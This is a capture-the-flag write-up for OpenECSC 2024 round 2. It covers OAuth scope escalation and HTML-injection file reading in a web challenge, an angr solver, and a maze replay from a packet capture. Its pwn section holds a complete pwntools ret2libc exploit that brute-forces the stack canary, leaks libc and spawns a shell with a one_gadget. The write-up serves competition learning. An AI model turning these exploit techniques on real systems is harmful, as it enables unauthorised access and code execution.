# OpenECSC 2024 round 2
https://github.com/ECSC2024/openECSC-2024 <br>
https://open.ecsc2024.it/


### Index
- [Web](#web)
    - [WOauth a laundry!](#WOauth)
- [Reversing](#Reversing)
    - [anti-rev](#anti-rev)
- [Pwn](#Pwn)
    - [guessinggame](#guessinggame)
- [Misc](#misc)
    - [blindmaze](#blind_maze)
    - [revenge of the blind maze](#revenge-of-the-blind-maze)



# Web

## Woauth
Welcome to our innovative business, the only ONE Laundry capable of completely sanitize your clothing by removing 100% of bacteria and viruses. <br>
Flag is in /flag.txt. <br>
Site: http://woauthalaundry.challs.open.ecsc2024.it <br>

### Solution

1. first you need to retrieve an authentication bearer token with access permissions to the admin endpoint from the openid endpoint. You do this, by adding %20admin to the scope parameter in the request. <br>
```http
GET /openid/authentication?response_type=token%20id_token&client_id=ELX4Gr0HSRZx&scope=openid%20laundry%20amenities%20admin&redirect_uri=http://localhost:5173/&grant_type=implicit&nonce=nonce HTTP/1.1
Host: woauthalaundry.challs.open.ecsc2024.it
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
Accept: */*
Referer: http://woauthalaundry.challs.open.ecsc2024.it/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

2. Then you can access the admin endpoint with the token. <br>
```http
GET /api/v1/admin HTTP/1.1
Host: woauthalaundry.challs.open.ecsc2024.it
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
Accept: */*
Referer: http://woauthalaundry.challs.open.ecsc2024.it/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Authorization: Bearer 211368ac8d75406685715751112e53ba
```

3. On the admin endoint, you get knowledge of another endpoint, the /api/v1/generate-report endpoint. <br>
to get the flag, you have to send a POST request to the /api/v1/generate-report endpoint with the following body: <br>
```bash
curl -X POST -v -d '{"requiredBy": "<object data='/flag.txt'></object>" }' -H "Authorization: Bearer 211368ac8d75406685715751112e53ba" -H "Content-Type: application/json" "http://woauthalaundry.challs.open.ecsc2024.it/api/v1/generate-report" --output out.pdf
```

# Reversing

## anti-rev
Good luck finding the secret word for my super secure program! <br>


### Solution
This is a perfect challenge to showcase a simple angr usecase. <br>
You tell angr to explore the binary until it reaches the success stdout output while avoiding the failure stdout output. <br>

```python
import angr
import claripy
import sys

flag_length = 31

def is_successful(state):
    #Successful print
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    if  b'Correct' in stdout_output:
        return True
    else:
        return False

def should_abort(state):
    #Avoid this print
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return b'Wrong' in stdout_output

project = angr.Project('./anti-rev')

# create a symbolic variable (BVS - Bitvector Symbolic)
flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(flag_length)]

flag = claripy.Concat(*flag_chars + [claripy.BVV(b'\n')]) # add newline character to the end


# create a new state with the flag as input
state = project.factory.full_init_state(
    args=['./anti-rev'], 
    add_options=angr.options.unicorn, 
    stdin=flag
)

# add constraints to flag characters to be printable ascii characters
for c in flag_chars:
    state.solver.add(c >= ord('!'))
    state.solver.add(c <= ord('~'))

sim_manager = project.factory.simulation_manager(state)

# explore the binary until the success address is reached while avoiding the failure address
sim_manager.explore(find=is_successful, avoid=should_abort)

if len(sim_manager.found) > 0:
    for found in sim_manager.found:
        print(found.posix.dumps(0))
else:
    print("Flag not found")
```


# Pwn

## guessinggame
The title says it all. Guess the secret! <br>
nc yetanotherguessinggame.challs.open.ecsc2024.it 38010 <br>

It is a ret2libc challenge with every protection enabled. <br>

### Solution

1. first you have to get the stack canary by guessing it byte by byte. <br>
2. then you do the same with an address with known offset (main+198) on the stack. <br>
3. with that address you calculate the base of the binary. <br>
4. then you leak the address of puts from the GOT to calculate the base of libc. <br>
5. finally you use a one_gadget to get a shell. <br>


```bash
# file ./yet_another_guessing_game
./yet_another_guessing_game: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=79b76182e93909b7d4e4f252d6b66f5dff4d67c1, for GNU/Linux 3.2.0, not stripped

# checksec --file=./yet_another_guessing_game
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   79 Symbols	  No	0		1		./yet_another_guessing_game
```

Here the decompiled pseudo C code of the game function by ghidra:
```C
void game(void)
{
    int32_t iVar1;
    int64_t iVar2;
    undefined8 uVar3;
    int64_t in_FS_OFFSET;
    unsigned long fildes;
    char *buf[40];
    undefined auStack_20 [16];
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);  // generate random stack canary
    iVar1 = open("/dev/urandom", 0);
    if (iVar1 < 0) {
        print_and_exit("[-] open /dev/urandom");
    }
    iVar2 = read(iVar1, auStack_20, 0x10);
    if (iVar2 != 0x10) {
        print_and_exit("[-] read /dev/urandom");
    }
    iVar1 = close(iVar1);
    if (iVar1 != 0) {
        print_and_exit("[-] close /dev/urandom");
    }
    do {
        puts("Guess the secret!");
        read(0, &buf, 0x68);
        uVar3 = strlen(&buf);
        iVar1 = memcmp(&buf, auStack_20, uVar3);
        if (iVar1 == 0) {
            puts("You win!");
        } else {
            puts("You lose!");
        }
        puts("Wanna play again? (y/n)");
        iVar1 = getchar();
    } while (iVar1 == 'y');
    puts("Goodbye!");
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) { // check if canary is still the same
        __stack_chk_fail();
    }
    return;
}
```

The exploit script:
```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        # requires gdb, gdbserver installed
        # https://docs.pwntools.com/en/stable/gdb.html
        print("starting gdb...")
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # run on ctf server, arguments: 'server-host', 'server-port'
        print("connecting to remote server...")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        print("starting local process...")
#        return process([exe] + argv, *a, **kw)
        return process([ld.path, elf.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})  # Run with specific linker to preload specific libc


# Specify your GDB script here for debugging
gdbscript = '''
source /usr/share/pwndbg/gdbinit.py
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './yet_another_guessing_game'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)


libc = ELF("./libc.so.6")  # Load libc
ld = ELF("./ld-linux-x86-64.so.2")  # Load linker

# Enable verbose logging so we can see exactly what is being sent (info/debug)
# context.log_level = 'debug'

# set terminal window to use for gdb debugging
context.terminal = ['alacritty', '-e']

info("Context:")
info("exe: "+str(exe))
info("arch: "+str(context.arch))
info("bits: "+str(context.bits))
info("os: "+str(context.os))
info("endian: "+str(context.endian))
info("log_level: "+str(context.log_level))
info("terminal: "+str(context.terminal))

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# CANARY IN STACK:
# 16 bytes A
# 8 bytes guessed canary ending with \x00 to terminate strlen()
# 16 bytes padding to fill rest of user_input buffer
# 16 bytes A
# 8 bytes real canary
# 0x7ffef84be1b0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  │AAAAAAAA│AAAAAAAA│
# 0x7ffef84be1c0  42 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │B.......│........│ // guessed canary - starting with 0x42 (B)
# 0x7ffef84be1d0  00 00 00 00 00 00 00 00  41 41 41 41 41 41 41 41  │........│AAAAAAAA│
# 0x7ffef84be1e0  41 41 41 41 41 41 41 41  00 5a f4 e0 db 2e 68 8f  │AAAAAAAA│.Z....h.│ // real canary - starting with 0x00


# get the canary by guessing it byte by byte
def get_canary(io):
    guessed_canary = b"B"  # guessed canary ends with \x00, which would terminate strlen(), overwrite it with B

    for i in range(7):  # loop through 7 bytes of canary, 1 byte at a time, 8th byte is \x00
        for b in range(1, 256): # loop through all possible bytes

            payload = flat(
                b"A"*16,         # will be compared with random_data buffer
                guessed_canary,
                bytes([b]),      # single guessed byte
                b"\x00"*(40-16-len(guessed_canary)-1),  # fills rest of user_input buffer with \0x00 
                # 40 -> user_input buffer size, 16 -> random_data buffer size, -1 because of added 'B'
                b"A"*16,          # fills random_data buffer with A's
                b"B"              # overwrites real canary's \x00 with B
            )

            io.sendafter(b"secret!\n", payload)

            response = io.recvline().strip().decode()
            # print('payload: ', payload)
            # print('response: ', response, guessed_canary+bytes([b]))

            io.sendafter(b"(y/n)\n", b"y")

            if "win" in response:
                guessed_canary+=bytes([b])
                info("guessed "+str(i+1)+" bytes of canary: "+str(guessed_canary))
                break



    # print("GUESSED CANARY: "+str(guessed_canary.hex()))

    return guessed_canary


# PIE LEAK:
# 0x7fffffffe418  00 00 00 00 03 00 00 00  41 41 41 41 41 41 41 41  │........│AAAAAAAA│
# 0x7fffffffe428  41 41 41 41 41 41 41 41  CA NA RY 00 00 00 00 00  │AAAAAAAA│CANARY..│ // padding + canary for memcmp()
# 0x7fffffffe438  43 43 43 43 43 43 43 43  b8 e5 ff ff ff 7f 00 00  │CCCCCCCC│ADDRESS.│ // padding + address
# 0x7fffffffe448  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  │AAAAAAAA|AAAAAAAA│
# 0x7fffffffe458  CA NA RY 00 00 00 00 00  43 43 43 43 43 43 43 43  │CANARY..│CCCCCCCC│
# 0x7fffffffe468  83 54 55 55 55 55 00 00  57 65 6c 63 6f 6d 65 20  │.TUUUU..│Welcome.│
# 0x7fffffffe478  74 6f 20 74 68 65 20 67  75 65 73 73 69 6e 67 20  │to.the.g│uessing.│
# 0x7fffffffe488  67 61 6d 65 21 0a 00 00  70 e5 ff ff ff 7f 00 00  │game!...│p.......│

# get the an address with known offset (main+198) by guessing it byte by byte
def get_pie(io, canary):

    address = b""
    for i in range(6):  # loop through 6 bytes of pie, 1 byte at a time, 7th and 8th byte is \x00
        for b in range(1, 256):  # loop through all possible bytes
            payload = flat(
                b"A"*16,         # will be compared with random_data buffer
                canary,          # needed for the memcmp() to pass
                b"C"*8,          # padding
                address,         # guessed pie
                bytes([b]),      # add single guessed byte
                b"\x00"*(40-16-16-len(address)-1),  # fills rest of user_input buffer with \0x00
                # -16 because of "A"*16, -16 because of canary + "C"*8, -1 because of added byte
                b"A"*16,         # fills random_data buffer with A's
                canary,          
                b"C"*8           # padding
            )

            io.sendafter(b"secret!\n", payload)
            answer = io.recvline().strip().decode()
            # print(answer, address+bytes([b]))

            io.sendafter(b"(y/n)\n", b"y")
            if "win" in answer:
                address+=bytes([b])
                info("guessed "+str(i+1)+" bytes of pie: "+str(address))
                break

    return address

# get the base address of libc by leaking the address of puts
def get_libc_base(io, canary):

    rop = ROP(elf)  # Load ROP chain from binary

    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]  # pop rdi; ret - get gadget address in the binary

    info(f"POP RDI: {hex(POP_RDI)}")

    # leak the address of puts
    payload = flat(
        b"A"*56,         # padding
        b"\x00",         # null byte
        canary[1:],      # canary, with the last byte (B) removed
        b"B"*8,          # padding
        p64(POP_RDI),    # overwrite return address with address of "pop rdi; ret"
        # pop rdi; ret is used to pop the address of puts@got from the stack into rdi
        # puts is called with the address of puts@got as argument
        p64(elf.got["puts"]),  # puts@got - address of puts in the GOT is used as argument for puts
        p64(elf.symbols["puts"]),  # puts@plt - puts is called with the address of puts@got as argument
        p64(elf.symbols["game"])   # game - to restart the game
    )

    io.sendafter(b"secret!\n", payload)  
    answer = io.recvline().strip().decode()  # get the answer of the game
    # print('answer: ', str(answer))  # answer of the game
    io.sendafter(b"(y/n)\n", b"n")  # send n to restart the game, to trigger returning to main
    io.recvline()  # skip the game over message
     
    LIBC_PUTS = u64(io.recvline()[:-1] + b"\x00"*2)  # get the leaked address of puts from the game
    # 2*\x00 because of the null byte at the end of the address
    info(f"LIBC PUTS ADDRESS: {hex(LIBC_PUTS)}")  # print the address of puts

    # calculate the base address of libc by subtracting the offset of puts in libc from the leaked address of puts
    return LIBC_PUTS - libc.symbols["puts"] # return the base address of libc



def main():

    # Start program
    io = start()

 
    canary = get_canary(io)
    elf_leak = get_pie(io, canary)

    # set the base address of the binary
    elf.address = u64(elf_leak+b"\x00"*2)-198 - elf.symbols["main"] # -198 to get the base address of the binary
    # elf.symbols["main"] - offset of main function to binary base address
    # u64 - unpack 64-bit integer (little-endian) 

    printable_canary = canary[1:][::-1] + b'\x00'  # real canary is the guessed canary without the last byte (B) reversed and with \x00 at the end
    info(f"CANARY: {printable_canary.hex()}")
    printable_pie = elf_leak[::-1]
    info(f"LEAK: {printable_pie.hex()}") # main+198

    info("PIEBASE: %#x", elf.address)

    libc.address = get_libc_base(io, canary)
    info(f"LIBC BASE ADDRESS: {hex(libc.address)}")

    # https://github.com/david942j/one_gadget
    # one_gadget ./libc.so.6  # get gadget (second one)
    one_gadget = libc.address + 0xe3b01
    info("ONE_GADGET: " + hex(one_gadget))

    payload = flat(
        b"A"*56,         # padding
        b"\x00",         # null byte for canary
        canary[1:],      # canary, with the last byte (B) removed
        b"B"*8,          # padding
        p64(one_gadget)  # one gadget, which will give us a shell
    )

    io.sendafter(b"secret!\n", payload)

    io.sendafter(b"(y/n)\n", b"n")


    # get shell
    io.interactive()


if __name__ == "__main__":
    main()
```

# Misc

## blind_maze
Welcome to the blind maze, you move without knowing the outcome and maybe you will reach the end, good luck. <br>
A previous winner left us a strange file. Maybe it will help you. <br>
Site: http://blindmaze.challs.open.ecsc2024.it <br>

Organizers forgot to remove the flag from the packet capture file. <br>
Because of this, revenge of the blind maze challenge was created. <br>

### Solution

```bash
tail capture.pcap  # get flag
```

## Revenge of the blind maze
Welcome back to the blind maze, this time you'll have a harder time finding the flag, good luck. <br>
Site: http://blindmazerevenge.challs.open.ecsc2024.it <br>

### Solution

first remove all FAILED requests from packet capture file. You do this by removeing requests of responses containing "FAILED" in capture.pcap, by marking them with ctrl+m and then exporting unmarked packets to a new file. <br>
Then extract the solutions from the new file with the following command: <br>
```bash
tshark -r capture.pcap -Y 'http.request' -T fields -e http.request.uri.query > directions.txt
```

After that resend the requests with a python script:
```python
#!/bin/python3

# https://docs.python-requests.org/en/latest/index.html
# https://github.com/psf/requests
import requests

s = requests.Session() 
 
# loop through extracted solutions 
with open('directions_not_failed.txt', 'r') as file:
    for i, line in enumerate(file, start=1):  

        # Debugging info:
        # print()
        # print('-------------------')
        # print('cookiejar before: ')
        # print(s.cookies.get_dict())

        while True:
            # time.sleep(1)
            print(f"Line {i}: {line}")
            url = 'http://blindmazerevenge.challs.open.ecsc2024.it/maze'
            line = line.strip()
            response = s.get(url, params={'direction': line})

            # check if request failed and resend if so
            if 'FAILED' in response.text:
                print("FAILED, resending request...")
                continue
            break

        # Debugging info:
        # print('session headers: ')
        # print(s.headers)
        # print('cookiejar after: ')
        # print(s.cookies.get_dict())
        # print('request headers: ')
        # print(response.request.headers)
        # print('response headers: ')
        # print(response.headers)
        # print('status_code: '+str(response.status_code))
        # print('request url: '+response.url)
        # # print(response.text)  # response body (html)
        # print('body: '+str(response.text))  # response body
        # print('-------------------')
        # print()

        # check if flag is in response
        if 'open' in str(response.text):
            print('======================')
            print('======================')
            print('FLAG FOUND:')
            print(response.text)
            print('======================')
            print('======================')
            exit()

```
